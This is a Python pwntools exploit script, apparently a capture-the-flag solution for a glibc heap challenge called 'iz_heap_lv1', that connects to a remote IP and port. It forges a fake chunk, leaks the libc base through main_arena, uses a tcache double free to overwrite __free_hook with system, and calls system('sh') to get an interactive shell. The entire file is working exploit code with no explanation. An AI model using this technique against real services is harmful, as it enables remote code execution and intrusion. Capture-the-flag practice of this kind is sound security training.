from pwn import *

NAME = 0x602100

libc = ELF('./libc.so.6')
MAIN_ARENA = 0x3ebc40

def edit(index, size, data):
	r.sendlineafter('Choice: \n', '2')
	r.sendlineafter('Enter index: ', str(index))
	r.sendlineafter('Enter size: ', str(size))
	r.sendafter('Enter data: ', data)

def delete(index):
	r.sendlineafter('Choice: \n', '3')
	r.sendlineafter('Enter index: ', str(index))

def show_name(name=None):
	r.sendlineafter('Choice: \n', '4')
	if name is None:
		r.sendlineafter('DO you want to edit: (Y/N)', 'N')
	else:
		r.sendlineafter('DO you want to edit: (Y/N)', 'Y')
		r.sendafter('Input name: ', name)
	r.recvuntil('Name: ')
	return r.recvline()

r = remote('165.22.110.249', 3333)
# r = process('./iz_heap_lv1_patched')

payload = ''
payload += p64(NAME + 0x10)
payload += p64(0x91)
payload += 'A' * 0x88
payload += p64(0x21)
payload += 'A' * 0x18
payload += p64(0x21)
r.sendafter('Input name: ', payload)

for i in range(7):
	edit(i, 0x88, 'hoge')
for i in range(7):
	delete(i)

delete(20)

show_name('A' * 0x10)
LIBC_BASE = u64(show_name()[0x10:-1].ljust(8, '\x00')) - (MAIN_ARENA + 0x60)
log.info('LIBC_BASE: {:#x}'.format(LIBC_BASE))

payload = ''
payload += p64(0)
payload += p64(0x91)
show_name(payload)

edit(20, 0x18, 'hoge')
CHUNK = u64(show_name()[:-1].ljust(8, '\x00'))
delete(20)

show_name(p64(CHUNK))
delete(20)

edit(0, 0x18, p64(LIBC_BASE + libc.symbols['__free_hook']))
edit(1, 0x18, 'sh\x00')
edit(2, 0x18, p64(LIBC_BASE + libc.symbols['system']))

delete(1)

r.interactive()
